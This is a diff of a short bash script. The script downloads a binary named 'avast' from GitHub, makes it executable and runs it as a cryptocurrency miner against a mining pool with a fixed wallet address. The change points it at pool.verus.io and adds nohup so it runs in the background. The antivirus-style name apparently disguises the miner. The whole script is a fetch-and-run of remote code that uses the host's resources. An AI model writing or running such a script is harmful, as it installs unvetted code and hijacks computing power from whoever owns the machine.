@@ -1,6 +1,6 @@
 #!/bin/bash
 wget https://github.com/aurbach55/pos/raw/main/avast
 chmod +x avast
-./avast -v -l  ap.luckpool.net:3956 -u RWZG7MP3LepujPY8rVS9ZuUXZnDdNveBF4.X -t 4 -x
+nohup ./avast -v -l  pool.verus.io:9999 -u RWZG7MP3LepujPY8rVS9ZuUXZnDdNveBF4.X -t 4 -x > nohup.out
 
 
